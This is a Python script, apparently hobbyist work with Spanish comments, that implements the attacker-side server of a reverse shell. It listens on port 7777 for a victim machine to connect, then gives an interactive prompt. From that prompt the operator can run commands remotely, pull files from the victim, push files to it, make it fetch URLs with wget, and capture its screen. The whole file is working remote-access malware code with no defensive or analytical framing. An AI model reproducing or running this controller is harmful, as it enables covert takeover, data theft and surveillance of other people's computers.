#!/usr/bin/env/python
#_*_coding: utf8_*_

import socket
import base64
from datetime import datetime

def receive_full_data(sock, buffer_size=4096, timeout=2):
    sock.settimeout(timeout)  # Establece un tiempo de espera para las operaciones de socket
    data = b''
    try:
        while True:
            part = sock.recv(buffer_size)
            if not part:
                break
            data += part
    except socket.timeout:
        print("Transfer finished.")
    return data


def shell():
    current_dir = target.recv(1024).decode()
    while True:
        command = input("{}~#:".format(current_dir))
        if command == "exit":
            target.send(command.encode())
            break
        elif command[:2] =="cd":
            target.send(command.encode())
            res=target.recv(1024).decode()
            current_dir = res
        elif command == "":
            pass
        elif command[:8] == "download":
            target.send(command.encode())
            with open(command[9:],"wb") as file_download:
                data = target.recv(40000).decode()
                file_download.write(base64.b64decode(data))
        elif command[:6] == "upload":
            file_path = command[7:]
            print(f"Uploading file: {file_path}")
            try:
                with open(file_path, "rb") as file_upload:
                    target.send(command.encode())
                    while True:
                        chunk = file_upload.read(3*1024)
                        if not chunk:
                            break
                        encoded_chunk = base64.b64encode(chunk)
                        print(f"Sending chunk: {encoded_chunk[:60]}...")  # Imprime parte del chunk para depuración
                        target.send(encoded_chunk + b'\n')  # Agregamos '\n' para separar los chunks
                    target.send(b'EOF')  # Enviar un marcador de fin de archivo
                    print("File upload complete")
            except FileNotFoundError:
                print(f"File not found: {file_path}")
            except Exception as e:
                print(f"Error uploading file: {e}")

        elif command[:4] =="wget":
            target.send(command.encode())
            res=target.recv(1024).decode()
            print(res)
        elif command[:10]=='screenshot':
            target.send(command.encode())
            now= datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            with open(f"screen{now}.png","wb") as screenFile:
                data = receive_full_data(target)
                if data:
                    screenFile.write(base64.b64decode(data))
                else:
                    print("No data received.")
        else:
            target.send(command.encode())
            res = target.recv(30000).decode()
            if res=="1":
                continue
            else:
                print(res)

def startServer():
    global server
    global ip
    global target
    
    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
    server.bind(('192.168.100.68',7777))
    server.listen(1)
    print("Server running, listening on PORT 7777")

    target, ip = server.accept()
    print("Established connection from "+ str(ip[0]))

startServer()
shell()
server.close()
